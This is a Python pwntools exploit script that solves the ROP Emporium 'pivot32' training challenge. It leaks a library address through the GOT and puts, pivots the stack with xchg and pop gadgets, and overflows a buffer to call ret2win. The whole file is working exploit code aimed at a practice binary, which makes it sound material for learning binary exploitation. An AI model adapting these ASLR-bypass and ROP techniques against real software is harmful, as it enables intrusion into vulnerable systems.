#!/usr/bin/env python3
# Solution to ROP Emporium pivot32
from pwn import *

context.log_level = "debug"
context.binary = elf = ELF("./pivot32")     # Set context and load binary
io = process()      # Start the binary in a process
# gdb.attach(io)

rop = ROP(elf)      # Create ROP object

offset = 44     # offset to the EIP/RIP

# -----------------------------------------------
# Gadgets
# -----------------------------------------------

xchg = p32(0x0804882e) # 0x0804882e: xchg eax, esp; ret;
pop = p32(0x0804882c) # 0x0804882c: pop eax; ret;

# -----------------------------------------------
# Addresses
# -----------------------------------------------

foot_plt = p32(elf.plt.foothold_function)
foot_got = p32(elf.got.foothold_function)
puts_plt = p32(elf.plt.puts)
main_ptr = p32(elf.symbols.main)

# -----------------------------------------------
# offsets
# -----------------------------------------------

# readelf -s libpivot32.so
foothold_offset = 0x77d
ret2win_offset = 0x974

# -----------------------------------------------
# Leaked address
# -----------------------------------------------

io.recvuntil(b"pivot: ")
leak = p32(int(io.recvline(), 16))

# -----------------------------------------------
# Leak foothold_function@got
# -----------------------------------------------

io.recvuntil(b"> ")

addr_leak = flat([
    foot_plt,   # Populate GOT
    puts_plt,   # Call puts
    main_ptr,   # Return back to main after puts
    foot_got    # Print foothold_function@got address
])
io.sendline(addr_leak)    # Send payload to leak and run main again

# -----------------------------------------------
# Stack smash -> Pivot to new stack
# -----------------------------------------------

io.recvuntil(b"> ")
rop.raw([pop, leak, xchg])
rop_chain = rop.chain()
payload = b""
payload += b"A" * offset
payload += rop_chain
io.sendline(payload)

# -----------------------------------------------
# Get leaked address
# -----------------------------------------------

io.recvuntil(b"libpivot\n")
leaked_addresses = io.recv()  # Receive info until next input
foot_leak = unpack(leaked_addresses[:4])

# -----------------------------------------------
# Calculations
# -----------------------------------------------

lib_base = foot_leak - foothold_offset
ret2win_addr = lib_base + ret2win_offset
print(f"re2win address: {hex(ret2win_addr)}")

# -----------------------------------------------
# Stack smash -> Call ret2win()
# -----------------------------------------------

win = flat([
    b"A" * offset,
    ret2win_addr
])


io.sendline(win)
io.recvuntil(b"Thank you!\n")
io.recv()
